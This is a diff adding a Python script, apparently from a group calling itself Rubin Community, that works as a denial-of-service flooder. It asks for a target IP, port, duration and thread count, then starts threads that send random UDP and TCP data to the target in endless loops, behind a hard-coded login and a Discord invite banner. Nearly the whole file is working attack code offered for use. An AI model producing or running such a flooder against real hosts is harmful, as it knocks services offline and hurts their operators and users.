@@ -1,0 +1,123 @@
+#AUTHOR SAMP NUDOS
+import random
+import socket
+import threading
+import os
+import sys
+import time
+
+###### MESSAGE MIKA ON TOP! #####
+os.system("clear")
+os.system("Rubin Community https://discord.com/invite/pUmPmy7w")
+print("\u001b[35m Chào Mừng Đến Với Rubin Community")
+time.sleep(2)
+print("Loading.......")
+os.system("clear")
+
+#### Login       
+
+attemps = 0
+
+while attemps < 100:
+    username = input('Ten Dang Nhap: ')
+    password = input('Mat Khau: ')
+
+    if username == 'RUBIN' and password == '123':
+        print('Chào Mừng Bạn Đã Đến Với RUBIN')
+        break
+    else:
+        print('Sai Tên Đăng Nhập Hoặc Mật Khẩu.')
+        attemps += 1
+        continue
+os.system("clear")
+
+print("""
+\u001b[35m
+	  SCRIPT BY : RUBIN
+	π======================================
+	π======================================
+	π======================================
+	π======================================
+	π============R̶U̶B̶I̶N̶ ̶C̶O̶M̶M̶U̶N̶I̶T̶Y̶=========
+	π======================================
+	π======================================
+	π======================================
+""")
+
+ip = str(input(" Target IP :"))
+port = int(input(" Target Port :"))
+choice = str(input(" (y/n) :"))
+times = int(input(" Time :"))
+threads = int(input(" Threads :"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"ATTACK BY RUBIN")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(999)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"ATTACK BY RUBIN")
+		except:
+			s.close()
+			print("[*] Error!!!")
+            
+
+def run3():
+	data = random._urandom(818)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
+            
+  
+def run4():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"ATTACK BY RUBIN")
+		except:
+			s.close()
+			print("[*] Error!!!")
+											
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+else:
+		th = threading.Thread(target = run4)
+		th.start()
